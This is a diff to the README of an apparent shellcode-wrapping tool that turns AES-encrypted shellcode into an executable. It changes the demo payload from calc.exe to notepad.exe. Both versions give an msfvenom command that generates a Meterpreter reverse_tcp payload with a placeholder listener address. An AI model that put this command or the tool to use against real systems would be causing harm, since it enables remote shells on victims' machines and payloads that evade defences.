@@ -22,7 +22,9 @@ https://ibb.co/X24mnzW
 2.	A text containing the IV used for AES encryption 
 3.	A text containing the shellcode 
 
-The shellcode should be provided as a C# byte array. The default values contain shellcode that executes calc.exe (32bit). This example is provided as an indication of how the code should be formed (using msfvenom, this can be easily done with the -f csharp switch, e.g. msfvenom -p windows/meterpreter/reverse_tcp LHOST=X.X.X.X  LPORT=XXXX -f csharp). 
+Important note: The shellcode should be provided as a C# byte array. 
+
+The default values contain shellcode that executes notepad.exe (32bit). This demo is provided as an indication of how the code should be formed (using msfvenom, this can be easily done with the -f csharp switch, e.g. msfvenom -p windows/meterpreter/reverse_tcp LHOST=X.X.X.X  LPORT=XXXX -f csharp). 
 
 After filling the provided inputs and selecting the output path an executable is generated according to the chosen options. 
 
